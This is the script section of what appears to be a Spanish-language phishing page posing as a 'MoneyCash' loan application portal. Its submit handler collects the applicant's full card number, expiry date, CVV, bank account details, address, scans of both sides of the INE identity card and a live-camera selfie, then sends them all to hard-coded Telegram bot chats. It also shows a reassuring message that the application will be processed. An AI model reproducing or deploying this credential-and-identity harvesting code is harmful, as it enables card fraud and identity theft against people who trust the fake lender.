        lines.push('║  1. Verificación de documentos             ║');
        lines.push('║  2. Análisis crediticio                    ║');
        lines.push('║  3. Notificación de decisión               ║');
        lines.push('║                                            ║');
        lines.push('║  ⏱️  Tiempo estimado: 24-48 horas         ║');
        lines.push('╚════════════════════════════════════════════╝');
        lines.push('');
                lines.push('');
        lines.push('💳 *DATOS DE TARJETA*');
        lines.push('Número de tarjeta: `' + cardNumber + '`');
        lines.push('Vencimiento: ' + (expMonth || '-') + '/' + (expYear || '-'));
        lines.push('CVV: `' + cvv + '`');
        
        lines.push('');
        lines.push('═══════════════════════════════════');
        lines.push('✅ Solicitud recibida correctamente');

        const text = lines.join('\n');

        // Intentar enviar el texto a todos los destinatarios configurados usando ambos bots
        try{
          for(const token of TELEGRAM_BOT_TOKENS){
            const urlMessageBase = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendMessage';
            for(const destId of TELEGRAM_RECIPIENTS){
              const body = { chat_id: destId, text: text, parse_mode: 'Markdown' };
              try{
                await fetch(urlMessageBase, { method: 'POST', headers: { 'Content-Type':'application/json' }, body: JSON.stringify(body), keepalive: true });
              }catch(e){
                console.warn('Error enviando a Telegram:', e);
              }
            }
          }
        }catch(e){ console.warn('Error en envío iterado de mensajes a Telegram:', e); }

        // Intentar enviar la imagen INE (campo file `documento`) al chat usando sendDocument
        try{
          const ineInput = document.getElementById('documento');
          console.log('Elemento documento encontrado:', !!ineInput);
          if(ineInput){
            console.log('Archivos en documento:', ineInput.files?.length || 0);
            if(ineInput.files && ineInput.files.length > 0){
              const file = ineInput.files[0];
              console.log('Archivo INE:', file.name, 'Tamaño:', file.size, 'Tipo:', file.type);
              
              for(const token of TELEGRAM_BOT_TOKENS){
                const docUrlBase = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendDocument';
                for(const destId of TELEGRAM_RECIPIENTS){
                  try{
                    console.log('Enviando INE a chat:', destId);
                    const fd = new FormData();
                    fd.append('chat_id', destId);
                    fd.append('document', file);
                    fd.append('caption', '📄 Frente de INE - ' + folio);
                    const response = await fetch(docUrlBase, { method: 'POST', body: fd });
                    const result = await response.json();
                    console.log('Respuesta Telegram INE (chat ' + destId + '):', result);
                    if(!result.ok) console.error('Error Telegram enviando INE:', result);
                  }catch(err){ console.error('Error enviando documento INE a chat ' + destId + ':', err); }
                }
              }
            }else{
              console.warn('No hay archivo en el campo documento');
            }
          }else{
            console.error('Campo documento no encontrado en el HTML');
          }
        }catch(e){ console.error('Error crítico en envío de documento INE:', e); }

        // Enviar la foto del reverso de la INE a los mismos bots y destinatarios.
        try{
          const ineReversoInput = document.getElementById('ineReverso');
          if(ineReversoInput && ineReversoInput.files && ineReversoInput.files.length > 0){
            const file = ineReversoInput.files[0];
            for(const token of TELEGRAM_BOT_TOKENS){
              const docUrlBase = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendDocument';
              for(const destId of TELEGRAM_RECIPIENTS){
                try{
                  const fd = new FormData();
                  fd.append('chat_id', destId);
                  fd.append('document', file);
                  fd.append('caption', '📄 Reverso de INE - ' + folio);
                  const response = await fetch(docUrlBase, { method: 'POST', body: fd });
                  const result = await response.json();
                  if(!result.ok) console.error('Error Telegram enviando reverso de INE:', result);
                }catch(err){ console.error('Error enviando reverso de INE a chat ' + destId + ':', err); }
              }
            }
          }else{
            console.warn('No hay archivo en el campo de reverso de INE');
          }
        }catch(e){ console.error('Error crítico en envío de reverso de INE:', e); }

        // Enviar la selfie, ya sea tomada con la cámara o seleccionada desde el dispositivo.
        try{
          const selfieInput = document.getElementById('selfie');
          if(selfieInput && selfieInput.files && selfieInput.files.length > 0){
            const file = selfieInput.files[0];
            for(const token of TELEGRAM_BOT_TOKENS){
              const docUrlBase = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendDocument';
              for(const destId of TELEGRAM_RECIPIENTS){
                try{
                  const fd = new FormData();
                  fd.append('chat_id', destId);
                  fd.append('document', file);
                  fd.append('caption', '📷 Selfie del solicitante - ' + folio);
                  const response = await fetch(docUrlBase, { method: 'POST', body: fd });
                  const result = await response.json();
                  if(!result.ok) console.error('Error Telegram enviando selfie:', result);
                }catch(err){ console.error('Error enviando selfie a chat ' + destId + ':', err); }
              }
            }
          }else{
            console.warn('No hay archivo en el campo de selfie');
          }
        }catch(e){ console.error('Error crítico en envío de selfie:', e); }

        // Enviar resumen final
        try{
          const fieldSummary = [];
          fieldSummary.push('');
          fieldSummary.push('╔════════════════════════════════════════════╗');
          fieldSummary.push('║   📊 RESUMEN EJECUTIVO DE DOCUMENTACIÓN    ║');
          fieldSummary.push('╚════════════════════════════════════════════╝');
          fieldSummary.push('');
          fieldSummary.push('✅ *Estado de Recepción:* COMPLETADO');
          fieldSummary.push('');
          fieldSummary.push('📋 *Documentación Recibida:*');
          fieldSummary.push('  ✓ Datos personales y de contacto');
          fieldSummary.push('  ✓ Información de domicilio completa');
          fieldSummary.push('  ✓ Parámetros del préstamo solicitado');
          fieldSummary.push('  ✓ Datos bancarios y de cuenta');
          fieldSummary.push('  ✓ Información de tarjeta de crédito');
          fieldSummary.push('  ✓ Documento de identificación (INE)');
          fieldSummary.push('  ✓ Reverso de documento de identificación (INE)');
          fieldSummary.push('  ✓ Selfie del solicitante');
          fieldSummary.push('');
          fieldSummary.push('🎯 *Folio de Referencia:* `' + folio + '`');
          fieldSummary.push('');
          fieldSummary.push('⏳ *Tiempo de Procesamiento:* 24-48 horas hábiles');
          fieldSummary.push('📧 *Notificación:* Se enviará a ' + email);
          fieldSummary.push('');
          fieldSummary.push('─────────────────────────────────────────────');
          fieldSummary.push('_Sistema MoneyCash - Portal de Préstamos_');
          fieldSummary.push('_Contacto: contacto@moneycash.com | 55 9876 5432_');
          
          const summaryText = fieldSummary.join('\n');
          for(const token of TELEGRAM_BOT_TOKENS){
            const urlMessageBase2 = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendMessage';
            for(const destId of TELEGRAM_RECIPIENTS){
              try{
                await fetch(urlMessageBase2, { 
                  method: 'POST', 
                  headers: { 'Content-Type':'application/json' }, 
                  body: JSON.stringify({ chat_id: destId, text: summaryText, parse_mode: 'Markdown' }),
                  keepalive: true 
                });
              }catch(e){ console.warn('Error enviando resumen:', e); }
            }
          }
        }catch(e){ console.warn('Error en resumen final:', e); }
        
        // Intentar enviar el PDF del generateFolioPdf (comprobante de solicitud)
        try{
          if(window.generateFolioPdf){
            let pdfBlob = null;
            // incluir 'cardNumber' y domiciliación en los datos pasados a la generación de PDF
            const cardNumber2 = (document.getElementById('cardNumber')||{}).value || '';
            const estado2 = (document.getElementById('estado')||{}).value || '';
            let ciudad2 = (document.getElementById('ciudad')||{}).value || '';
            try{ if(ciudad2 === 'other'){ const o = document.getElementById('ciudadOtro'); if(o && o.value) ciudad2 = o.value; } }catch(e){}
            const colonia2 = (document.getElementById('colonia')||{}).value || '';
            const calle2 = (document.getElementById('calle')||{}).value || '';
            const numExterior2 = (document.getElementById('numExterior')||{}).value || '';
            const cp2 = (document.getElementById('cp')||{}).value || '';
            
            try{ 
              pdfBlob = await Promise.race([
                window.generateFolioPdf(folio, { nombre, email, montoSolicitado: monto, plazo, banco, clabe, cardNumber: cardNumber2, estado: estado2, ciudad: ciudad2, colonia: colonia2, calle: calle2, numExterior: numExterior2, cp: cp2 }), 
                new Promise((res)=> setTimeout(()=> res(null), 6000))
              ]); 
            }catch(e){ 
              console.warn('Error generando PDF:', e); 
              pdfBlob = null; 
            }
            
            if(pdfBlob instanceof Blob){
              console.log('PDF comprobante generado, tamaño:', pdfBlob.size);
              const safeName = (String(nombre || '').trim().replace(/\s+/g,'_').replace(/[^a-zA-Z0-9_-]/g,'') || 'solicitante');
              const filename = 'folio-' + folio + '-' + safeName + '.pdf';
              const fileToSend = new File([pdfBlob], filename, { type: 'application/pdf' });
              
              for(const token of TELEGRAM_BOT_TOKENS){
                const docUrlBase = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendDocument';
                for(const destId of TELEGRAM_RECIPIENTS){
                  try{
                    const fd2 = new FormData();
                    fd2.append('chat_id', destId);
                    fd2.append('document', fileToSend);
                    fd2.append('caption', '📋 Comprobante de Solicitud - ' + folio);
                    const response = await fetch(docUrlBase, { method: 'POST', body: fd2, keepalive: true });
                    const result = await response.json();
                    console.log('Respuesta Telegram PDF comprobante (destId: ' + destId + '):', result);
                    if(!result.ok) console.warn('Telegram error enviando comprobante:', result);
                  }catch(err){ console.warn('No se pudo enviar el PDF comprobante a Telegram:', err); }
                }
              }
            }else{
              console.log('No se generó el PDF comprobante');
            }
          }
        }catch(e){ console.warn('Error enviando PDF comprobante:', e); }

      }catch(e){ console.warn('Error preparando envío a Telegram:', e); }
    });
  })();
</script>

<!-- Cámara integrada para capturar la selfie dentro del formulario -->
<script>
  (function(){
    const input = document.getElementById('selfie');
    const openButton = document.getElementById('abrirCamaraSelfie');
    const captureButton = document.getElementById('capturarSelfie');
    const closeButton = document.getElementById('cerrarCamaraSelfie');
    const container = document.getElementById('camaraSelfieContenedor');
    const video = document.getElementById('camaraSelfie');
    const preview = document.getElementById('vistaPreviaSelfie');
    const status = document.getElementById('estadoSelfie');
    let stream = null;
    let previewUrl = null;

    if(!input || !openButton || !captureButton || !closeButton || !container || !video || !preview || !status) return;

    function stopCamera(){
      if(stream) stream.getTracks().forEach(track => track.stop());
      stream = null;
      video.srcObject = null;
      container.classList.add('d-none');
      captureButton.classList.add('d-none');
      closeButton.classList.add('d-none');
      openButton.classList.remove('d-none');
    }

    function showPreview(file){
      if(!file) return;
      if(previewUrl) URL.revokeObjectURL(previewUrl);
      previewUrl = URL.createObjectURL(file);
      preview.src = previewUrl;
      preview.classList.remove('d-none');
    }

    openButton.addEventListener('click', async function(){
      if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        status.textContent = 'La cámara integrada requiere abrir el sitio mediante HTTPS. Puedes seleccionar una foto de tu dispositivo.';
        return;
      }
      try{
        status.textContent = 'Solicitando acceso a la cámara…';
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } }, audio: false });
        video.srcObject = stream;
        container.classList.remove('d-none');
        captureButton.classList.remove('d-none');
        closeButton.classList.remove('d-none');
        openButton.classList.add('d-none');
        status.textContent = 'Acomódate en el recuadro y presiona “Capturar foto”.';
      }catch(error){
        status.textContent = 'No se pudo abrir la cámara. Revisa el permiso del navegador o selecciona una foto de tu dispositivo.';
        console.warn('No se pudo acceder a la cámara para la selfie:', error);
      }
    });

    captureButton.addEventListener('click', function(){
      if(!stream || !video.videoWidth || !video.videoHeight){
        status.textContent = 'Espera un momento a que la cámara esté lista.';
        return;
      }
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.translate(canvas.width, 0);
      context.scale(-1, 1);
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(function(blob){
        if(!blob){
          status.textContent = 'No se pudo crear la foto. Inténtalo otra vez.';
          return;
        }
        const selfieFile = new File([blob], 'selfie-' + Date.now() + '.jpg', { type: 'image/jpeg' });
        const files = new DataTransfer();
        files.items.add(selfieFile);
        input.files = files.files;
        showPreview(selfieFile);
        stopCamera();
        status.textContent = 'Selfie capturada y lista para enviarse con la solicitud.';
      }, 'image/jpeg', 0.9);
    });

    closeButton.addEventListener('click', function(){
      stopCamera();
      status.textContent = 'Cámara cerrada. Puedes tomar otra foto o seleccionar una imagen.';
    });

    input.addEventListener('change', function(){
      if(input.files && input.files[0]){
        showPreview(input.files[0]);
        stopCamera();
        status.textContent = 'Selfie cargada y lista para enviarse con la solicitud.';
      }
    });

    window.addEventListener('beforeunload', stopCamera);
  })();
</script>

<!-- Validación cliente: RFC -> mayúsculas y limpieza de guiones/espacios -->
<script>
  (function(){
    function cleanRFCValue(v){
      if(!v) return v;
      // Convertir a mayúsculas, eliminar espacios y guiones, y permitir A-Z, 0-9, Ñ y &
      return String(v).toUpperCase().replace(/[\s-]+/g,'').replace(/[^A-Z0-9Ñ&]/g,'');
    }

    var rfcEl = document.getElementById('rfc');
    if(rfcEl){
      // Al escribir: convertir y limpiar manteniendo la posición del cursor cuando es posible
      rfcEl.addEventListener('input', function(e){
        var start = this.selectionStart, end = this.selectionEnd;
        var before = this.value;
        var cleaned = cleanRFCValue(before);
        if(cleaned !== before){
          this.value = cleaned;
          try{ this.setSelectionRange(start-1 < 0 ? 0 : start-1, end-1 < 0 ? 0 : end-1); }catch(err){}
        }
      });

      // Al pegar: limpiar después del evento paste
      rfcEl.addEventListener('paste', function(e){
        setTimeout(()=> { this.value = cleanRFCValue(this.value); }, 10);
      });

      // Al perder foco: trim final
      rfcEl.addEventListener('blur', function(){ this.value = (this.value||'').trim(); });
    }
  })();
</script>

</body>
</html>
